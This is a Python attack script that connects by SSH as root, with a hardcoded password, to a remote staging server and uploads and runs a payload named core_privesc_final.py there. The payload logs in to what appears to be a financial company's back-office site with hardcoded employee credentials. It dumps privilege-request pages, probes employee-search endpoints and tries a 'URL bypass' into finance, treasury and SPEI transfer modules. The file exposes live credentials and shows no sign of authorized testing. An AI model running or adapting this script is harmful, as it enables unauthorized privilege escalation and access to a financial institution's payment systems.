import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b\n\n")

# ====================================================
# 1. FULL DUMP of insertar_sol_priv.do
# ====================================================
sys.stdout.write("="*60 + "\n=== insertar_sol_priv.do FULL ===\n" + "="*60 + "\n\n")
r1 = s.get("https://core.findep.mx/backoffice/insertar_sol_priv.do", timeout=15)
sys.stdout.write(f"[{r1.status_code}] {len(r1.text)}b\n")
sys.stdout.write(r1.text + "\n\n")

# ====================================================
# 2. FULL DUMP of aut_sol_priv.do
# ====================================================
sys.stdout.write("="*60 + "\n=== aut_sol_priv.do FULL ===\n" + "="*60 + "\n\n")
r2 = s.get("https://core.findep.mx/backoffice/aut_sol_priv.do", timeout=15)
sys.stdout.write(f"[{r2.status_code}] {len(r2.text)}b\n")
sys.stdout.write(r2.text + "\n\n")

# ====================================================
# 3. FULL DUMP solicitar_privilegio.do
# ====================================================
sys.stdout.write("="*60 + "\n=== solicitar_privilegio.do FULL ===\n" + "="*60 + "\n\n")
r3 = s.get("https://core.findep.mx/backoffice/solicitar_privilegio.do", timeout=15)
sys.stdout.write(f"[{r3.status_code}] {len(r3.text)}b\n")
sys.stdout.write(r3.text + "\n\n")

# ====================================================
# 4. Navigate the expected flow: adm_perfil -> employee search
# ====================================================
sys.stdout.write("="*60 + "\n=== EMPLOYEE SEARCH FLOW ===\n" + "="*60 + "\n\n")

# Try the employee form (frmempleado_con_admp_admp)
emp_paths = [
    ("GET", "/backoffice/empleado_con_admp.do", {}),
    ("POST", "/backoffice/empleado_con_admp.do", {"id_aef": "1"}),
    ("GET", "/backoffice/empleado_con_admp_admp.do", {}),
    ("POST", "/backoffice/empleado_con_admp_admp.do", {"buscar": "CRUZ"}),
    ("POST", "/backoffice/empleado_con_admp_admp.do", {"id_aef": "jcruzval"}),
    ("GET", "/backoffice/buscar_empleado.do", {}),
    ("POST", "/backoffice/buscar_empleado.do", {"nombre": "CRUZ"}),
    ("POST", "/backoffice/buscar_empleado.do", {"cve_emp": "jcruzval"}),
    ("GET", "/backoffice/empleado_busqueda.do", {}),
    ("POST", "/backoffice/empleado_busqueda.do", {"nombre": "CRUZ VALDEZ"}),
]

for method, path, data in emp_paths:
    try:
        url = f"https://core.findep.mx{path}"
        if method == "GET":
            r = s.get(url, timeout=10, allow_redirects=False)
        else:
            r = s.post(url, data=data, timeout=10, allow_redirects=False)
        
        if r.status_code != 404 and len(r.text) not in [1071, 1149]:
            sys.stdout.write(f"\n  [{r.status_code}] {method} {path} data={data} ({len(r.text)}b)\n")
            
            # Extract forms/selects/inputs
            forms = re.findall(r'<form[^>]*(?:action="([^"]*)")?[^>]*(?:name="([^"]*)")?', r.text)
            useful_forms = [(a,n) for a,n in forms if a or n]
            if useful_forms:
                sys.stdout.write(f"    Forms: {useful_forms}\n")
            
            inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
            if inputs:
                sys.stdout.write(f"    Inputs: {inputs[:20]}\n")
            
            selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
            for sel_name, sel_body in selects:
                options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
                sys.stdout.write(f"    Select '{sel_name}': {options[:20]}\n")
            
            # Tables with data
            trs = re.findall(r'<tr[^>]*>(.*?)</tr>', r.text, re.S)
            data_rows = [tr for tr in trs if re.search(r'(?:empleado|privilegio|modulo|perfil)', tr, re.I)]
            if data_rows:
                sys.stdout.write(f"    Data rows: {len(data_rows)}\n")
                for row in data_rows[:5]:
                    cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.S)
                    sys.stdout.write(f"      {[c.strip()[:50] for c in cells]}\n")
            
            if len(r.text) > 3000:
                sys.stdout.write(f"    Body[0:3000]: {r.text[:3000]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {path}: {e}\n")
    sys.stdout.flush()

# ====================================================
# 5. Directly try to get Finanzas module through URL bypass
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== FINANZAS URL BYPASS ===\n" + "="*60 + "\n\n")

fin_paths = [
    "/finanzas/finanzas_index.do",
    "/finanzas/pagos_index.do",
    "/finanzas/tesoreria_index.do",
    "/finanzas/transferencias.do",
    "/finanzas/spei.do",
    "/finanzas/caja.do",
    "/finanzas/bancos_index.do",
    "/finanzas/conciliacion.do",
    "/finanzas/dispersiones.do",
    "/finanzas/cartera.do",
    "/finanzas/comisiones.do",
    "/finanzas/cobranza.do",
]

for p in fin_paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=8, allow_redirects=False)
        sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
        if r.status_code == 200 and len(r.text) > 3000:
            sys.stdout.write(f"    ACCESSIBLE!\n")
            title = re.search(r'<title>(.*?)</title>', r.text[:2000])
            sys.stdout.write(f"    Title: {title.group(1) if title else 'N/A'}\n")
        elif r.status_code == 302:
            sys.stdout.write(f"    Redirect: {r.headers.get('Location','?')}\n")
        if "NoValido" in r.text or "NoValidado" in r.text:
            sys.stdout.write(f"    -> BLOCKED (NoValidado)\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_privesc_final.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_privesc_final.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
